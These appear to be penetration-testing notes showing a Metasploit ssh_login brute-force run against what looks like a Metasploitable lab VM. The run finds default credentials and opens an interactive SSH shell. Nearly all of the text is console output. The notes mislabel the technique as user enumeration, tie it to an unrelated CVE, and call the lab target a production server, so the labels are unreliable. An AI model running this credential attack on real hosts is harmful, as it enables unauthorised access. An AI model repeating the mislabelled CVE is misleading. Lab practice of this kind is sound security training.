# **Exploit Chain for Production Server**

## SSH - OpenSSH 4.7p1 (CVE-2010-4478)

- SSH user enumeration attack (auxiliary/scanner/ssh/ssh_login)
needs username/password lists but its a great angle for "default creds as exploit"

  msf auxiliary(scanner/ssh/ssh_login) > run
  
  [*] 192.168.56.175:22     - Starting bruteforce
  
  [*] 192.168.56.175:22 SSH - Testing User/Pass combinations

  [+] 192.168.56.175:22     - Success: 'msfadmin:msfadmin' 'uid=1000
  (msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),
  25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111
  (lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux 
  metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC
  2008 i686 GNU/Linux '
  
  [*] SSH session 1 opened (100.111.40.45:35063 -> 192.168.56.
  175:22) at 2026-06-03 22:10:09 -0600
  
  [*] Scanned 1 of 1 hosts (100% complete)
  
  [*] Auxiliary module execution completed
  
  msf auxiliary(scanner/ssh/ssh_login) >
  
  msf auxiliary(scanner/ssh/ssh_login) > sessions

  Active sessions
  ===============

    Id  Name  Type         Information   Connection
    --  ----  ----         -----------   ----------
    1         shell linux  SSH surzal @  100.111.40.45:35
                                         063 -> 192.168.5
                                         6.175:22 (192.16
                                         8.56.175)

  msf auxiliary(scanner/ssh/ssh_login) > use 1
  [-] Invalid module index: 1
  msf auxiliary(scanner/ssh/ssh_login) > session 1
  [-] Unknown command: session. Did you mean sessions? Run the help command for more details.
  msf auxiliary(scanner/ssh/ssh_login) > sessions 1
  [*] Starting interaction with 1...

  whoami
  msfadmin

